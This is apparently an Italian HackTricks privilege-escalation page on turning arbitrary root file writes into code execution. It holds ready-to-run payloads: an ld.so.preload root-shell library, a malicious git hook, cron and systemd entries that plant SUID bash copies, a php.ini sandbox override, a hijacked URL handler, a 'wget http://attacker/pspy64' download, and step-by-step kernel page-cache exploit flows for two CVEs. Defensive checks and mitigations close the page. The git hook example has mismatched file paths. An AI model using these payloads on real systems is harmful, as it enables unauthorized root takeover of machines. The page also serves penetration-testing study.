# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`**, ma funziona anche nei **binari SUID**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** in occasione di vari **eventi** in un repository git, ad esempio quando viene creato un commit, eseguito un merge... Quindi, se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, questo può essere usato per il **privesc**.

Ad esempio, è possibile **generare uno script** in un repository git nella cartella **`.git/hooks`**, in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### File Cron e di temporizzazione

Se puoi **scrivere file relativi a Cron che vengono eseguiti da root**, di solito puoi ottenere code execution alla successiva esecuzione del job. Tra i target interessanti ci sono:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor in un target di un timer esistente** modificando lo script o il binario che avvia

Esempio minimo di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece un file eseguibile lì:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i nomi di file contenenti punti, quindi preferisci nomi come `backup` invece di `backup.sh`.
- Alcune distro usano timer `anacron` o `systemd` invece del cron classico, ma l'idea dell'abuso è la stessa: **modificare ciò che root eseguirà in seguito**.

### File di Service e Socket

Se puoi scrivere **file unit di `systemd`** o i file da essi referenziati, potresti riuscire a ottenere l'esecuzione di codice come root ricaricando e riavviando l'unit, oppure aspettando che venga attivato il percorso di attivazione del service/socket.

I target interessanti includono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari di service referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un service root

Controlli rapidi:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in una service unit di proprietà di root che puoi modificare
- **Aggiungere un drop-in override** con un `ExecStart=` malevolo e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dalla unit
- **Dirottare un servizio attivato da socket** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override malevolo:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare personalmente i servizi ma puoi modificare un'unità attivata tramite socket, potrebbe essere sufficiente **attendere una connessione client** per attivare l'esecuzione del servizio con backdoor come root.

### Sovrascrivere un `php.ini` restrittivo usato da una sandbox PHP privilegiata

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (ad esempio, `disable_functions=exec,system,...`). Se il codice nella sandbox dispone ancora di **qualsiasi primitiva di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto di `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e quindi inviare un secondo payload che viene eseguito con privilegi elevati.

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue il codice ora che le funzioni pericolose sono nuovamente abilitate.

Esempio minimo (sostituisci il percorso usato dal daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o esegue la convalida utilizzando percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Si tratta essenzialmente di una **privilege escalation tramite sovrascrittura della configurazione** quando il runtime in sandbox può comunque scrivere file.

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quali tipi di file. TODO: verificare i requisiti per abusarne in modo da eseguire una rev shell quando viene aperto un tipo di file comune.

### Sovrascrivere gli handler degli schemi (come http: o https:)

Un attacker con permessi di scrittura sulle directory di configurazione di una vittima può facilmente sostituire o creare file che modificano il comportamento del sistema, causando l'esecuzione involontaria di codice. Modificando il file `$HOME/.config/mimeapps.list` per indirizzare gli handler degli URL HTTP e HTTPS verso un file malevolo (ad esempio, impostando `x-scheme-handler/http=evil.desktop`), l'attacker fa sì che **facendo clic su qualsiasi link http o https venga eseguito il codice specificato nel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` all'interno di `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per maggiori informazioni, consulta [**questo post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), dove è stato utilizzato per sfruttare una vulnerabilità reale.

### Root esegue script/binari scrivibili dall'utente

Se un flusso di lavoro privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:

- **Rileva l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare Root mentre invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file target sia la sua directory siano di proprietà del tuo utente o scrivibili da esso.
- **Hijack del target:** esegui il backup del binary/script originale e inserisci un payload che crei una shell SUID (o esegua qualsiasi altra azione root), quindi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad esempio, premendo un pulsante UI che avvia l'helper). Quando root riesegue il path dirottato, ottieni la shell con privilegi elevati usando `./rootshell -p`.

### Modifica dei file privilegiati limitata alla page cache

Alcuni bug del kernel non modificano il file **su disco**. Permettono invece di modificare solo la copia nella **page cache** di un file leggibile. Se puoi prendere di mira un binario **setuid** o comunque eseguito da **root**, l'esecuzione successiva può eseguire byte controllati dall'attaccante presenti in memoria ed effettuare un'escalation dei privilegi, anche se l'hash del file su disco rimane invariato.

È utile considerarlo come una **primitiva di scrittura dei file valida solo a runtime**:

- **Il disco rimane pulito**: l'inode e i byte su disco non cambiano
- **La memoria è dirty**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attaccante
- **L'effetto è temporaneo**: la modifica scompare dopo un riavvio o l'eviction dalla cache

Questa primitiva si colloca tra la classica **arbitrary file write** e i vecchi bug di abuso della **page cache**, come Dirty COW / Dirty Pipe:

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitiva limitata alla page cache può essere più affidabile se il path vulnerabile consente scritture dirette nelle pagine file-backed memorizzate nella cache

#### Generic privesc flow

1. Ottieni una primitiva del kernel in grado di scrivere nelle pagine della page cache **file-backed**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l'esecuzione **prima** che la pagina venga rimossa dalla cache
4. Ottieni code execution come root mentre il file su disco appare ancora invariato

Target tipici di alto valore:

- Binari **setuid-root**
- Helper avviati da **servizi root**
- Binari eseguiti comunemente da **container che condividono il kernel/page cache dell'host**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il path vulnerabile si trovava nella userspace API crittografica di Linux (`AF_ALG` / `algif_aead`):

- `splice()` può spostare riferimenti a pagine della page cache da un file leggibile nella scatterlist TX della crypto
- il path di decrypt in-place di `algif_aead` riutilizzava i buffer di origine e destinazione
- `authencesn` scriveva quindi nella regione del tag di destinazione
- quando tale regione faceva ancora riferimento a pagine file-backed ottenute tramite splice, la scrittura finiva nella **page cache del file target**

La tecnica interessante non è quindi la CVE in sé, ma il pattern:

- **inserire pagine della cache file-backed in un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare un piccolo overwrite controllato in memoria

Il PoC pubblico usava scritture ripetute da **4 byte** per modificare `/usr/bin/su` in memoria e poi eseguirlo.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso pattern **page-cache-only write-to-root**, ma questa volta il sink è il **decrypt IPsec ESP** invece di `AF_ALG`.

La tecnica importante è il passaggio di **metadata-laundering**:

- `splice()` inserisce una pagina della page cache **read-only e file-backed** in un pacchetto ESP-in-UDP
- la mitigazione originale di DirtyFrag contrassegnava lo skb con `SKBFL_SHARED_FRAG`, affinché `esp_input()` eseguisse una **copy prima del decrypt**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone conserva lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi il clone sicuro ed esegue il decrypt **in-place `cbc(aes)`** sulla pagina file-backed

La lezione per il reviewer è più ampia della CVE: se una mitigazione dipende dai **metadata di skb/pagina** per decidere se un'operazione debba prima effettuare una copy, qualsiasi **path di clone/copy che conservi la pagina sottostante ma elimini i metadata** può riaprire silenziosamente la primitiva di scrittura.

Flusso di exploitation tipico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un network namespace privato**
2. attiva il loopback e installa una regola **netfilter `TEE`** in `mangle/OUTPUT`
3. installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target da 4 byte nel campo `seq_hi` della SA (il word-selection trick di DirtyFrag)
5. invia il pacchetto ESP-in-UDP ottenuto tramite splice, in modo che il **clone TEE** raggiunga `esp_input()` ed esegua il decrypt **in-place**
6. ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro eseguibile privilegiato contiene codice controllato dall'attaccante

Dal punto di vista operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file su disco rimane pulito, ma `execve()` usa i **byte modificati della page cache** ed esegue codice come root.

Controlli utili sull'esposizione per questa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La riduzione della superficie d'attacco a breve termine è anche specifica del path in questo caso: l'aggiornamento a un kernel che include `48f6a5356a33` corregge il clone path, mentre il blocco dell'autoload di `xt_TEE` rimuove lo **step di flag-laundering** e il blocco di `esp4` / `esp6` rimuove il **decrypt sink**.

#### Esposizione e hunting

Se sospetti questa classe di bug, non affidarti solo ai controlli di integrità del disco. Verifica anche:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato/scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che agisce solo sulla page cache può essere sufficiente per trasformare un foothold locale in root

#### Riduzione della superficie d'attacco per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se viene compilato nel kernel, alcune divulgazioni hanno segnalato il blocco del percorso init con:
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione è utile da ricordare anche per altri kernel LPE: se l'exploitation dipende da un'interfaccia opzionale specifica, disabilitare o mettere in blacklist tale interfaccia può interrompere il percorso dell'exploit anche prima che sia disponibile un aggiornamento completo del kernel.

## Riferimenti

- [HTB Bamboo – hijacking di uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: FAQ su Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Disclosure di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Fix Linux stable: crypto: algif_aead - ripristino del funzionamento out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Advisory di Copy Fail](https://copy.fail/)
- [Analisi tecnica di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Repository / README di DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: analisi e sfruttamento della variante LPE di Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Fix Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Mitigazione Linux precedente: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
